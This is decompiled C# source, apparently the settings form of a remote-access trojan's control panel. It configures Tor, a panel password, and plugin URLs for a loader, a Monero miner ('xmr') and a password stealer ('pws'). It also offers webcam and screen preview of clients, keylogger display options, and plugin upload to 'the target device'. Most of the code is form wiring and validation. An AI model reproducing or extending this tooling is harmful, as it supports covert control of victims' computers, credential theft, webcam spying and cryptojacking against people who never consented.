		this.visualButton_10 = visualButton_12;
		visualButton = this.visualButton_10;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000C9B RID: 3227 RVA: 0x00007C7F File Offset: 0x00005E7F
	internal TextBox vmethod_238()
	{
		return this.textBox_19;
	}

	// Token: 0x06000C9C RID: 3228 RVA: 0x00007C87 File Offset: 0x00005E87
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_239(TextBox textBox_20)
	{
		this.textBox_19 = textBox_20;
	}

	// Token: 0x06000C9D RID: 3229 RVA: 0x00007C90 File Offset: 0x00005E90
	internal Label vmethod_240()
	{
		return this.label_38;
	}

	// Token: 0x06000C9E RID: 3230 RVA: 0x00007C98 File Offset: 0x00005E98
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_241(Label label_40)
	{
		this.label_38 = label_40;
	}

	// Token: 0x06000C9F RID: 3231 RVA: 0x00007CA1 File Offset: 0x00005EA1
	internal PictureBox vmethod_242()
	{
		return this.pictureBox_15;
	}

	// Token: 0x06000CA0 RID: 3232 RVA: 0x0006244C File Offset: 0x0006064C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_243(PictureBox pictureBox_16)
	{
		EventHandler value = new EventHandler(this.method_67);
		PictureBox pictureBox = this.pictureBox_15;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_15 = pictureBox_16;
		pictureBox = this.pictureBox_15;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000CA1 RID: 3233 RVA: 0x00007CA9 File Offset: 0x00005EA9
	internal FastObjectListView vmethod_244()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x06000CA2 RID: 3234 RVA: 0x00007CB1 File Offset: 0x00005EB1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_245(FastObjectListView fastObjectListView_1)
	{
		this.fastObjectListView_0 = fastObjectListView_1;
	}

	// Token: 0x06000CA3 RID: 3235 RVA: 0x00007CBA File Offset: 0x00005EBA
	internal OLVColumn vmethod_246()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x06000CA4 RID: 3236 RVA: 0x00007CC2 File Offset: 0x00005EC2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_247(OLVColumn olvcolumn_2)
	{
		this.olvcolumn_0 = olvcolumn_2;
	}

	// Token: 0x06000CA5 RID: 3237 RVA: 0x00007CCB File Offset: 0x00005ECB
	internal OLVColumn vmethod_248()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x06000CA6 RID: 3238 RVA: 0x00007CD3 File Offset: 0x00005ED3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_249(OLVColumn olvcolumn_2)
	{
		this.olvcolumn_1 = olvcolumn_2;
	}

	// Token: 0x06000CA7 RID: 3239 RVA: 0x00007CDC File Offset: 0x00005EDC
	internal BackgroundWorker vmethod_250()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06000CA8 RID: 3240 RVA: 0x00062490 File Offset: 0x00060690
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_251(BackgroundWorker backgroundWorker_1)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_73);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_1;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06000CA9 RID: 3241 RVA: 0x00007CE4 File Offset: 0x00005EE4
	internal ContextMenuStrip vmethod_252()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06000CAA RID: 3242 RVA: 0x00007CEC File Offset: 0x00005EEC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_253(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06000CAB RID: 3243 RVA: 0x00007CF5 File Offset: 0x00005EF5
	internal ToolStripMenuItem vmethod_254()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06000CAC RID: 3244 RVA: 0x000624D4 File Offset: 0x000606D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_255(ToolStripMenuItem toolStripMenuItem_1)
	{
		EventHandler value = new EventHandler(this.method_74);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_0 = toolStripMenuItem_1;
		toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000CAD RID: 3245 RVA: 0x00007CFD File Offset: 0x00005EFD
	internal VisualButton vmethod_256()
	{
		return this.visualButton_11;
	}

	// Token: 0x06000CAE RID: 3246 RVA: 0x00062518 File Offset: 0x00060718
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_257(VisualButton visualButton_12)
	{
		EventHandler value = new EventHandler(this.method_75);
		VisualButton visualButton = this.visualButton_11;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_11 = visualButton_12;
		visualButton = this.visualButton_11;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000CAF RID: 3247 RVA: 0x00007D05 File Offset: 0x00005F05
	internal CheckBox vmethod_258()
	{
		return this.checkBox_15;
	}

	// Token: 0x06000CB0 RID: 3248 RVA: 0x00007D0D File Offset: 0x00005F0D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_259(CheckBox checkBox_18)
	{
		this.checkBox_15 = checkBox_18;
	}

	// Token: 0x06000CB1 RID: 3249 RVA: 0x00007D16 File Offset: 0x00005F16
	internal Label vmethod_260()
	{
		return this.label_39;
	}

	// Token: 0x06000CB2 RID: 3250 RVA: 0x00007D1E File Offset: 0x00005F1E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_261(Label label_40)
	{
		this.label_39 = label_40;
	}

	// Token: 0x06000CB3 RID: 3251 RVA: 0x00007D27 File Offset: 0x00005F27
	internal CheckBox vmethod_262()
	{
		return this.checkBox_16;
	}

	// Token: 0x06000CB4 RID: 3252 RVA: 0x00007D2F File Offset: 0x00005F2F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_263(CheckBox checkBox_18)
	{
		this.checkBox_16 = checkBox_18;
	}

	// Token: 0x06000CB5 RID: 3253 RVA: 0x00007D38 File Offset: 0x00005F38
	internal CheckBox vmethod_264()
	{
		return this.checkBox_17;
	}

	// Token: 0x06000CB6 RID: 3254 RVA: 0x00007D40 File Offset: 0x00005F40
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_265(CheckBox checkBox_18)
	{
		this.checkBox_17 = checkBox_18;
	}

	// Token: 0x06000CB7 RID: 3255 RVA: 0x00007D49 File Offset: 0x00005F49
	private void fSettings_Load(object sender, EventArgs e)
	{
		this.method_3();
	}

	// Token: 0x06000CB8 RID: 3256 RVA: 0x00007D51 File Offset: 0x00005F51
	public void method_0(Form form_0)
	{
		this.fMain_0 = (fMain)form_0;
	}

	// Token: 0x06000CB9 RID: 3257 RVA: 0x0006255C File Offset: 0x0006075C
	public void method_1()
	{
		if (this.vmethod_22().InvokeRequired)
		{
			this.vmethod_22().Invoke(new fSettings.Delegate59(this.method_1), new object[0]);
			return;
		}
		this.vmethod_22().Text = Conversions.ToString(Class135.smethod_0().PortMain);
		this.vmethod_134().Text = Conversions.ToString(Class135.smethod_0().PortTor);
		this.vmethod_18().Text = Class135.smethod_0().Password;
		this.vmethod_14().Text = Class135.smethod_0().HostMainIP;
		this.vmethod_120().Text = Class135.smethod_0().NetworkBandwidth;
		this.vmethod_16().Checked = Class135.smethod_0().AutostartMain;
		this.vmethod_138().Checked = Class135.smethod_0().AutostartTor;
		this.vmethod_126().Text = Class135.smethod_0().PluginsURLLoader;
		this.vmethod_42().Text = Class135.smethod_0().PluginsURLXMR;
		this.vmethod_130().Text = Class135.smethod_0().PluginsURLXMR64;
		this.vmethod_44().Text = Class135.smethod_0().PluginsURLPws;
		this.vmethod_114().Checked = Class135.smethod_0().PluginsUpload;
		this.vmethod_262().Checked = Class135.smethod_0().PluginsSavePws;
		this.vmethod_60().Checked = Class135.smethod_0().PreviewEnabled;
		this.vmethod_66().Checked = Class135.smethod_0().PreviewSourceScreen;
		this.vmethod_62().Checked = Class135.smethod_0().PreviewSourceWebcam;
		this.vmethod_72().Value = Class135.smethod_0().PreviewUpdateInterval;
		this.vmethod_104().Value = Class135.smethod_0().PreviewQuality;
		this.vmethod_92().Text = Conversions.ToString(Class135.smethod_0().PreviewDefaultX);
		this.vmethod_86().Text = Conversions.ToString(Class135.smethod_0().PreviewDefaultY);
		this.vmethod_82().Text = Conversions.ToString(Class135.smethod_0().PreviewDoubleClickX);
		this.vmethod_76().Text = Conversions.ToString(Class135.smethod_0().PreviewDoubleClickY);
		this.vmethod_102().Checked = Class135.smethod_0().PreviewDisplayFrameData;
		this.vmethod_110().Checked = Class135.smethod_0().PreviewTransparentFrames;
		this.vmethod_190().Checked = Class135.smethod_0().ConNotifications;
		this.vmethod_188().Checked = Class135.smethod_0().Gridlines;
		this.vmethod_200().Checked = Class135.smethod_0().ConKlgColors;
		this.vmethod_258().Checked = Class135.smethod_0().SettingsTray;
		this.vmethod_264().Checked = Class135.smethod_0().UIThumbnails;
		this.vmethod_206().Checked = Class135.smethod_0().TorDisableCaching;
		this.vmethod_210().Checked = Class135.smethod_0().TorAvoidDiskWrites;
		this.vmethod_212().Checked = Class135.smethod_0().TorRejectSingleHop;
		this.vmethod_218().Checked = Class135.smethod_0().TorNoExec;
		this.vmethod_216().Checked = Class135.smethod_0().TorUseConstrainedSockets;
		this.vmethod_222().Text = Class135.smethod_0().TorConstrainedSocketSize;
		this.vmethod_106().Text = Conversions.ToString(this.vmethod_104().Value) + "%";
		this.vmethod_68().Text = Conversions.ToString(this.vmethod_72().Value) + " ms";
		if (Operators.CompareString(this.vmethod_126().Text, "URL to plugin: http://site.com/loader.plg", true) != 0)
		{
			Font font = new Font(this.vmethod_42().Font, FontStyle.Regular);
			this.vmethod_126().Font = font;
			this.vmethod_126().ForeColor = Color.Black;
		}
		if (Operators.CompareString(this.vmethod_44().Text, "URL to plugin: http://site.com/pws.plg", true) != 0)
		{
			Font font2 = new Font(this.vmethod_44().Font, FontStyle.Regular);
			this.vmethod_44().Font = font2;
			this.vmethod_44().ForeColor = Color.Black;
		}
		if (Operators.CompareString(this.vmethod_42().Text, "URL to plugin: http://site.com/xmr.plg", true) != 0)
		{
			Font font3 = new Font(this.vmethod_42().Font, FontStyle.Regular);
			this.vmethod_42().Font = font3;
			this.vmethod_42().ForeColor = Color.Black;
		}
		if (Operators.CompareString(this.vmethod_130().Text, "URL to plugin: http://site.com/xmr64.plg", true) != 0)
		{
			Font font4 = new Font(this.vmethod_130().Font, FontStyle.Regular);
			this.vmethod_130().Font = font4;
			this.vmethod_130().ForeColor = Color.Black;
		}
		this.vmethod_130().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
		this.vmethod_126().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
		this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
		this.vmethod_44().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
		this.vmethod_52().Text = Conversions.ToString(Class135.smethod_0().TransfersRecvBytes);
		this.vmethod_28().Text = Conversions.ToString(Class135.smethod_0().TransfersSendBytes);
		this.vmethod_140().Text = Conversions.ToString(Class135.smethod_0().TransfersConcurrentMax);
		this.vmethod_150().Text = Conversions.ToString(Class135.smethod_0().MaxBandwidthRateIn);
		this.vmethod_156().Text = Conversions.ToString(Class135.smethod_0().MaxBandwidthRateOut);
		this.vmethod_162().Checked = Class135.smethod_0().TransferReplaceExisting;
		this.vmethod_166().Checked = Class135.smethod_0().TransferReplaceFilesModified;
		this.vmethod_168().Checked = Class135.smethod_0().TransferReplaceFilesAll;
		if (Class130.struct18_0.method_0())
		{
			this.vmethod_170().Text = "Stop socket";
			this.vmethod_170().Refresh();
		}
		else
		{
			this.vmethod_170().Text = "Start socket";
			this.vmethod_170().Refresh();
		}
		if (Class130.struct18_1.method_0())
		{
			this.vmethod_172().Text = "Stop socket";
			this.vmethod_172().Refresh();
		}
		else
		{
			this.vmethod_172().Text = "Start socket";
			this.vmethod_172().Refresh();
		}
		int num = 10;
		checked
		{
			do
			{
				this.vmethod_98().Items.Add(Conversions.ToString(num) + "%");
				num += 10;
			}
			while (num <= 100);
			int previewDefaultSize = Class135.smethod_0().PreviewDefaultSize;
			if (previewDefaultSize <= 50)
			{
				if (previewDefaultSize <= 20)
				{
					if (previewDefaultSize == 10)
					{
						this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[0]);
						goto IL_8AB;
					}
					if (previewDefaultSize == 20)
					{
						this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[1]);
						goto IL_8AB;
					}
				}
				else
				{
					if (previewDefaultSize == 30)
					{
						this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[2]);
						goto IL_8AB;
					}
					if (previewDefaultSize == 40)
					{
						this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[3]);
						goto IL_8AB;
					}
					if (previewDefaultSize == 50)
					{
						this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[4]);
						goto IL_8AB;
					}
				}
			}
			else if (previewDefaultSize <= 70)
			{
				if (previewDefaultSize == 60)
				{
					this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[5]);
					goto IL_8AB;
				}
				if (previewDefaultSize == 70)
				{
					this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[6]);
					goto IL_8AB;
				}
			}
			else
			{
				if (previewDefaultSize == 80)
				{
					this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[7]);
					goto IL_8AB;
				}
				if (previewDefaultSize == 90)
				{
					this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[8]);
					goto IL_8AB;
				}
				if (previewDefaultSize == 100)
				{
					this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[9]);
					goto IL_8AB;
				}
			}
			this.vmethod_98().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_98().Items[9]);
			IL_8AB:
			int num2 = 10;
			do
			{
				this.vmethod_94().Items.Add(Conversions.ToString(num2) + "%");
				num2 += 10;
			}
			while (num2 <= 100);
			int previewDoubleClickSize = Class135.smethod_0().PreviewDoubleClickSize;
			if (previewDoubleClickSize <= 50)
			{
				if (previewDoubleClickSize <= 20)
				{
					if (previewDoubleClickSize == 10)
					{
						this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[0]);
						goto IL_ACA;
					}
					if (previewDoubleClickSize == 20)
					{
						this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[1]);
						goto IL_ACA;
					}
				}
				else
				{
					if (previewDoubleClickSize == 30)
					{
						this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[2]);
						goto IL_ACA;
					}
					if (previewDoubleClickSize == 40)
					{
						this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[3]);
						goto IL_ACA;
					}
					if (previewDoubleClickSize == 50)
					{
						this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[4]);
						goto IL_ACA;
					}
				}
			}
			else if (previewDoubleClickSize <= 70)
			{
				if (previewDoubleClickSize == 60)
				{
					this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[5]);
					goto IL_ACA;
				}
				if (previewDoubleClickSize == 70)
				{
					this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[6]);
					goto IL_ACA;
				}
			}
			else
			{
				if (previewDoubleClickSize == 80)
				{
					this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[7]);
					goto IL_ACA;
				}
				if (previewDoubleClickSize == 90)
				{
					this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[8]);
					goto IL_ACA;
				}
				if (previewDoubleClickSize == 100)
				{
					this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[9]);
					goto IL_ACA;
				}
			}
			this.vmethod_94().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_94().Items[9]);
			IL_ACA:
			this.vmethod_244().VirtualMode = true;
			this.vmethod_244().View = View.Details;
			this.vmethod_244().FullRowSelect = true;
			this.vmethod_244().OwnerDraw = true;
			this.vmethod_244().GridLines = Class135.smethod_0().Gridlines;
			if (File.Exists(Application.StartupPath + "\\data\\settings\\firewall.txt"))
			{
				this.vmethod_244().ClearObjects();
				Class130.concurrentDictionary_9.Clear();
				string text = Application.StartupPath + "\\data\\settings\\firewall.txt";
				string[] array = Strings.Split(Class136.smethod_14(ref text), "\r\n", -1, CompareMethod.Text);
				array = Class136.smethod_3(array);
				int num3 = array.Length - 1;
				for (int i = 0; i <= num3; i++)
				{
					if (array[i].Length > 0)
					{
						cFWIP cFWIP = new cFWIP();
						cFWIP.IP = array[i];
						cFWIP.ATTEMPTS = Conversions.ToString(0);
						Class130.concurrentQueue_0.Enqueue(cFWIP);
						try
						{
							Class130.concurrentDictionary_9.TryAdd(array[i], cFWIP);
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
			if (!this.vmethod_250().IsBusy)
			{
				this.vmethod_250().RunWorkerAsync();
			}
		}
	}

	// Token: 0x06000CBA RID: 3258 RVA: 0x00007348 File Offset: 0x00005548
	private void fSettings_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06000CBB RID: 3259 RVA: 0x00007D5F File Offset: 0x00005F5F
	public void method_2()
	{
		if (Class130.struct18_0.method_0())
		{
			this.vmethod_170().Text = "Stop";
			return;
		}
		this.vmethod_170().Text = "Start";
	}

	// Token: 0x06000CBC RID: 3260 RVA: 0x00063178 File Offset: 0x00061378
	public void method_3()
	{
		checked
		{
			base.Left = (int)Math.Round(unchecked((double)Class130.fMain_0.Left + (double)Class130.fMain_0.Width / 2.0 - (double)base.Width / 2.0));
			base.Top = (int)Math.Round(unchecked((double)Class130.fMain_0.Top + (double)Class130.fMain_0.Height / 2.0 - (double)base.Height / 2.0));
		}
	}

	// Token: 0x06000CBD RID: 3261 RVA: 0x00063204 File Offset: 0x00061404
	private void method_4(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_28().Text) | Conversion.Val(this.vmethod_28().Text) < 256.0 | Conversion.Val(this.vmethod_28().Text) > 65536.0)
		{
			this.vmethod_28().BackColor = Color.Red;
			return;
		}
		this.vmethod_28().BackColor = Color.White;
	}

	// Token: 0x06000CBE RID: 3262 RVA: 0x00063280 File Offset: 0x00061480
	private void method_5(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_52().Text) | Conversion.Val(this.vmethod_52().Text) < 256.0 | Conversion.Val(this.vmethod_52().Text) > 65536.0)
		{
			this.vmethod_52().BackColor = Color.Red;
			return;
		}
		this.vmethod_52().BackColor = Color.White;
	}

	// Token: 0x06000CBF RID: 3263 RVA: 0x000632FC File Offset: 0x000614FC
	private void method_6(object sender, EventArgs e)
	{
		TextBox textBox;
		object text = (textBox = this.vmethod_18()).Text;
		ref object ptr = ref text;
		object obj = Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) > 0 & Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) <= 16;
		object operand = obj;
		textBox.Text = Conversions.ToString(text);
		if (Conversions.ToBoolean(Operators.NotObject(operand)))
		{
			this.vmethod_18().BackColor = Color.Red;
			return;
		}
		this.vmethod_18().BackColor = Color.White;
	}

	// Token: 0x06000CC0 RID: 3264 RVA: 0x00063384 File Offset: 0x00061584
	private void method_7(object sender, EventArgs e)
	{
		this.vmethod_42().BackColor = Color.White;
		if (Operators.CompareString(this.vmethod_42().Text, "URL to plugin: http://site.com/xmr.plg", true) == 0)
		{
			this.vmethod_42().Text = string.Empty;
			this.vmethod_42().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_42().Font, FontStyle.Regular);
			this.vmethod_42().Font = font;
		}
	}

	// Token: 0x06000CC1 RID: 3265 RVA: 0x000633F8 File Offset: 0x000615F8
	private void method_8(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_42().Text, string.Empty, true) == 0)
		{
			this.vmethod_42().Text = "URL to plugin: http://site.com/xmr.plg";
			this.vmethod_42().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_42().Font, FontStyle.Italic);
			this.vmethod_42().Font = font;
		}
	}

	// Token: 0x06000CC2 RID: 3266 RVA: 0x0006345C File Offset: 0x0006165C
	private void method_9(object sender, EventArgs e)
	{
		this.vmethod_44().BackColor = Color.White;
		if (Operators.CompareString(this.vmethod_44().Text, "URL to plugin: http://site.com/pws.plg", true) == 0)
		{
			this.vmethod_44().Text = string.Empty;
			this.vmethod_44().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_44().Font, FontStyle.Regular);
			this.vmethod_44().Font = font;
		}
	}

	// Token: 0x06000CC3 RID: 3267 RVA: 0x000634D0 File Offset: 0x000616D0
	private void method_10(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_44().Text, string.Empty, true) == 0)
		{
			this.vmethod_44().Text = "URL to plugin: http://site.com/pws.plg";
			this.vmethod_44().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_44().Font, FontStyle.Italic);
			this.vmethod_44().Font = font;
		}
	}

	// Token: 0x06000CC4 RID: 3268 RVA: 0x00063534 File Offset: 0x00061734
	private void method_11(object sender, EventArgs e)
	{
		this.vmethod_44().BackColor = Color.White;
		Font font = new Font(this.vmethod_44().Font, FontStyle.Regular);
		this.vmethod_44().Font = font;
	}

	// Token: 0x06000CC5 RID: 3269 RVA: 0x00063570 File Offset: 0x00061770
	private void method_12(object sender, EventArgs e)
	{
		this.vmethod_42().BackColor = Color.White;
		Font font = new Font(this.vmethod_42().Font, FontStyle.Regular);
		this.vmethod_42().Font = font;
	}

	// Token: 0x06000CC6 RID: 3270 RVA: 0x00007D8E File Offset: 0x00005F8E
	private void method_13(object sender, EventArgs e)
	{
		Interaction.MsgBox("Value that specifies the size of the socket's receive-buffer.\r\n\r\nNote:\r\nA larger buffer size potentially reduces the number of empty acknowledgements (TCP packets with no data portion), but might also delay the recognition of connection difficulties. Consider increasing the buffer size if you are transferring large files, or you are using a high bandwidth, high latency connection (such as a satellite broadband provider).", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CC7 RID: 3271 RVA: 0x00007DA2 File Offset: 0x00005FA2
	private void method_14(object sender, EventArgs e)
	{
		Interaction.MsgBox("Value that specifies the size of the socket's send-buffer.\r\n\r\nNote:\r\nA larger buffer size potentially reduces the number of empty acknowledgements (TCP packets with no data portion), but might also delay the recognition of connection difficulties. Consider increasing the buffer size if you are transferring large files, or you are using a high bandwidth, high latency connection (such as a satellite broadband provider).", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CC8 RID: 3272 RVA: 0x00007DB6 File Offset: 0x00005FB6
	private void method_15(object sender, EventArgs e)
	{
		Interaction.MsgBox("If enabled, a frame will appear with live feed from the chosen source when selecting and hovering the client for at least 2 seconds.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CC9 RID: 3273 RVA: 0x000635AC File Offset: 0x000617AC
	private void method_16(object sender, EventArgs e)
	{
		if (this.vmethod_60().Checked)
		{
			this.vmethod_66().Enabled = true;
			this.vmethod_62().Enabled = true;
			this.vmethod_72().Enabled = true;
			return;
		}
		this.vmethod_66().Enabled = false;
		this.vmethod_62().Enabled = false;
		this.vmethod_72().Enabled = false;
	}

	// Token: 0x06000CCA RID: 3274 RVA: 0x00007DCA File Offset: 0x00005FCA
	private void method_17(object sender, EventArgs e)
	{
		this.vmethod_68().Text = Conversions.ToString(this.vmethod_72().Value) + " ms";
	}

	// Token: 0x06000CCB RID: 3275 RVA: 0x00007DF1 File Offset: 0x00005FF1
	private void method_18(object sender, EventArgs e)
	{
		this.vmethod_106().Text = Conversions.ToString(this.vmethod_104().Value) + "%";
	}

	// Token: 0x06000CCC RID: 3276 RVA: 0x00063610 File Offset: 0x00061810
	private void method_19(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_92().Text) | Conversion.Val(this.vmethod_92().Text) < 128.0 | Conversion.Val(this.vmethod_92().Text) > 768.0)
		{
			this.vmethod_92().BackColor = Color.Red;
			return;
		}
		this.vmethod_92().BackColor = Color.White;
	}

	// Token: 0x06000CCD RID: 3277 RVA: 0x0006368C File Offset: 0x0006188C
	private void method_20(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_86().Text) | Conversion.Val(this.vmethod_86().Text) < 128.0 | Conversion.Val(this.vmethod_86().Text) > 1024.0)
		{
			this.vmethod_86().BackColor = Color.Red;
			return;
		}
		this.vmethod_86().BackColor = Color.White;
	}

	// Token: 0x06000CCE RID: 3278 RVA: 0x00063708 File Offset: 0x00061908
	private void method_21(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_82().Text) | Conversion.Val(this.vmethod_82().Text) < 128.0 | Conversion.Val(this.vmethod_82().Text) > 1920.0)
		{
			this.vmethod_82().BackColor = Color.Red;
			return;
		}
		this.vmethod_82().BackColor = Color.White;
	}

	// Token: 0x06000CCF RID: 3279 RVA: 0x00063784 File Offset: 0x00061984
	private void method_22(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_76().Text) | Conversion.Val(this.vmethod_76().Text) < 128.0 | Conversion.Val(this.vmethod_76().Text) > 1080.0)
		{
			this.vmethod_76().BackColor = Color.Red;
			return;
		}
		this.vmethod_76().BackColor = Color.White;
	}

	// Token: 0x06000CD0 RID: 3280 RVA: 0x00007E18 File Offset: 0x00006018
	private void method_23(object sender, EventArgs e)
	{
		Interaction.MsgBox("If enabled, necesary plugins will be uploaded from data\\plugins and cached on the target device.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CD1 RID: 3281 RVA: 0x00063800 File Offset: 0x00061A00
	private void method_24(object sender, EventArgs e)
	{
		this.vmethod_126().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
		this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
		this.vmethod_130().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
		this.vmethod_44().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
	}

	// Token: 0x06000CD2 RID: 3282 RVA: 0x00007E2C File Offset: 0x0000602C
	private void method_25(object sender, EventArgs e)
	{
		Interaction.MsgBox("All network interfaces are usually used for incoming connections. If an IP has been set, the relevant network interface will be used instead.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CD3 RID: 3283 RVA: 0x00007E40 File Offset: 0x00006040
	private void method_26(object sender, EventArgs e)
	{
		Interaction.MsgBox("Enter an URL to any online speedtest file, preferably a minimum of 10MB.\r\n\r\nNote:\r\nThis feature is optional.\r\nOnly use HTTP protocol for URL, not HTTPS (SSL/TLS).", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CD4 RID: 3284 RVA: 0x000638C0 File Offset: 0x00061AC0
	private void method_27(object sender, EventArgs e)
	{
		TextBox textBox;
		string text = (textBox = this.vmethod_120()).Text;
		ref string ptr = ref text;
		bool flag = false & Strings.LCase(ptr).StartsWith("https");
		if (ptr.ToLower().StartsWith("www."))
		{
			ptr = "http://" + ptr;
		}
		bool flag2 = Regex.IsMatch(ptr, "http(s)?://([\\w+?\\.\\w+])+([a-zA-Z0-9\\~\\!\\@\\#\\$\\%\\^\\&\\*\\(\\)_\\-\\=\\+\\\\\\/\\?\\.\\:\\;\\'\\,]*)?");
		bool flag3 = flag2;
		textBox.Text = text;
		if (!flag3)
		{
			this.vmethod_120().BackColor = Color.Red;
		}
		else
		{
			this.vmethod_120().BackColor = Color.White;
		}
		if (this.vmethod_120().TextLength == 0)
		{
			this.vmethod_120().BackColor = Color.White;
		}
	}

	// Token: 0x06000CD5 RID: 3285 RVA: 0x00063974 File Offset: 0x00061B74
	private void method_28(object sender, EventArgs e)
	{
		this.vmethod_126().BackColor = Color.White;
		Font font = new Font(this.vmethod_126().Font, FontStyle.Regular);
		this.vmethod_126().Font = font;
	}

	// Token: 0x06000CD6 RID: 3286 RVA: 0x000639B0 File Offset: 0x00061BB0
	private void method_29(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_126().Text, "URL to plugin: http://site.com/loader.plg", true) == 0)
		{
			this.vmethod_126().Text = string.Empty;
			this.vmethod_126().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_126().Font, FontStyle.Regular);
			this.vmethod_126().Font = font;
		}
	}

